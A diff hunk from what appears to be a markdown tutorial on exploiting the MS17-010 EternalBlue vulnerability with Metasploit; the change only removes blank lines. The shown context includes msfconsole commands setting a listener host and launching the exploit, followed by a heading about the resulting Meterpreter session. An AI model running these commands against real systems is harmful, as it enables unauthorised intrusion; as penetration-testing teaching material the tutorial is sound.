@@ -77,21 +77,9 @@ msf exploit(ms17_010_eternalblue) > set lhost 192.168.1.115
 msf exploit(ms17_010_eternalblue) > exploit
 ```
 
-
-
 #### Meterpreter Session
 
 > Meterpreter session of targeted system will show information regarding the system
-
-
-
-
-
-
-
-
-
-
 
 
 
